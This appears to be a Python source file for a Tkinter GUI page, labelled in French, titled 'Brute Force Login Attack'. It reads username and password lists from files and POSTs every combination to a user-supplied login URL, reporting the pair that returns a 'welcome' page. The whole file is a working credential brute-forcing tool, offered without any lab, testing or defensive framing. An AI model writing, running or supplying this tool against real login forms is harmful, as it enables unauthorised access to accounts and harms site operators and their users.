import tkinter as tk
from tkinter import messagebox
import requests

class bfPage(tk.Frame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller
        
        self.title_label = tk.Label(self, text="Brute Force Login Attack", font=("Arial", 16))
        self.title_label.pack(pady=20)

        # Champs pour l'URL, le fichier de mots de passe, le fichier de logins
        self.url_label = tk.Label(self, text="URL de Login (ex: http://example.com/login):")
        self.url_label.pack(pady=5)
        self.url_entry = tk.Entry(self, width=40)
        self.url_entry.pack(pady=5)

        self.login_label = tk.Label(self, text="Fichier des Logins (un par ligne) :")
        self.login_label.pack(pady=5)
        self.login_entry = tk.Entry(self, width=40)
        self.login_entry.pack(pady=5)

        self.password_label = tk.Label(self, text="Fichier des Mots de Passe (un par ligne) :")
        self.password_label.pack(pady=5)
        self.password_entry = tk.Entry(self, width=40)
        self.password_entry.pack(pady=5)

        # Boutons pour démarrer l'attaque
        self.start_button = tk.Button(self, text="Lancer l'attaque", command=self.start_attack)
        self.start_button.pack(pady=10)
        
        # Label pour afficher le statut
        self.status_label = tk.Label(self, text="", font=("Arial", 12))
        self.status_label.pack(pady=10)

    def start_attack(self):
        # Récupère les entrées de l'utilisateur
        url = self.url_entry.get()
        login_file = self.login_entry.get()
        password_file = self.password_entry.get()

        if not url or not login_file or not password_file:
            messagebox.showerror("Erreur", "Veuillez remplir tous les champs.")
            return
        
        # Charge les logins et mots de passe à tester
        try:
            with open(login_file, 'r') as f:
                logins = f.readlines()
            with open(password_file, 'r') as f:
                passwords = f.readlines()
        except FileNotFoundError:
            messagebox.showerror("Erreur", "Le fichier de logins ou de mots de passe est introuvable.")
            return
        
        self.status_label.config(text="L'attaque est en cours...")
        
        for login in logins:
            for password in passwords:
                login = login.strip()
                password = password.strip()
                if self.try_login(url, login, password):
                    self.status_label.config(text=f"Login trouvé: {login} / {password}")
                    return  # Arrête l'attaque dès que les bons credentials sont trouvés
        
        self.status_label.config(text="Aucun login/mot de passe trouvé.")

    def try_login(self, url, login, password):
        """Essayer une combinaison login/mot de passe."""
        data = {'username': login, 'password': password}  # Assurez-vous que cela correspond au formulaire
        try:
            response = requests.post(url, data=data)
            if "welcome" in response.text.lower():  # Adaptez cette condition selon la réponse du serveur
                return True
        except requests.exceptions.RequestException:
            pass
        return False